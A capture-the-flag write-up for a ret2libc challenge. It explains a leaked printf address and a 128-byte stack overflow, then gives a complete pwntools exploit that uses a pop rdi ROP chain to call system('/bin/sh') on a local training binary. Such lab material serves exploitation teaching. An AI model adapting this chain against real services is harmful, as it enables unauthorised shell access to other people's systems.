# Challenge 03: Ret2libc

## Difficulty: Medium

## Vulnerability Type: Stack Buffer Overflow + Ret2libc

## Description
No `win()` function in this binary. You need to leverage libc functions to spawn a shell. The program conveniently leaks a libc address.

## Protections
- **NX**: Enabled (can't execute shellcode on stack)
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial
- **ASLR**: Enabled (libc randomized, but leaked)

## Vulnerability Analysis

### Libc Leak
```c
printf("printf is at: %p\n", printf);
```
The program prints the address of `printf()` in libc, defeating ASLR.

### Buffer Overflow
```c
read(0, buffer, 512);  // 128-byte buffer
```

## Exploitation Strategy

### Step 1: Calculate Libc Base
```python
# Receive leaked printf address
p.recvuntil(b'at: ')
printf_leak = int(p.recvline().strip(), 16)

# Calculate libc base
libc.address = printf_leak - libc.symbols['printf']
```

### Step 2: Build Ret2libc Chain
We need to call `system("/bin/sh")`. For x64, the first argument goes in RDI:
```python
pop_rdi = # Find with ROPgadget
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

payload = b'A' * 136  # Offset to return address
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9003)
else:
    p = process('./challenge')

# Receive libc leak
p.recvuntil(b'at: ')
printf_leak = int(p.recvline().strip(), 16)
libc.address = printf_leak - libc.symbols['printf']

log.info(f"Printf leaked: {hex(printf_leak)}")
log.info(f"Libc base: {hex(libc.address)}")
log.info(f"System: {hex(libc.symbols['system'])}")

# Find gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # Stack alignment

# Build payload
bin_sh = next(libc.search(b'/bin/sh\x00'))
payload = b'A' * 136
payload += p64(ret)  # Stack alignment for system()
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(libc.symbols['system'])

p.sendafter(b'payload: ', payload)
p.interactive()
```

## Automated Detection
- **Libc Leak**: Program prints address of libc function
- **No Win Function**: No easy win function available
- **Buffer Overflow**: Standard stack overflow
- **Strategy**: Ret2libc using leaked address and ROP gadget for argument passing

## Alternative: One-gadget
If you have one_gadget tool, you can find addresses in libc that directly give a shell:
```bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

## Learning Objectives
- Ret2libc technique
- Libc ASLR bypass
- ROP gadgets for argument passing (pop rdi)
- x64 calling convention
- Stack alignment requirements
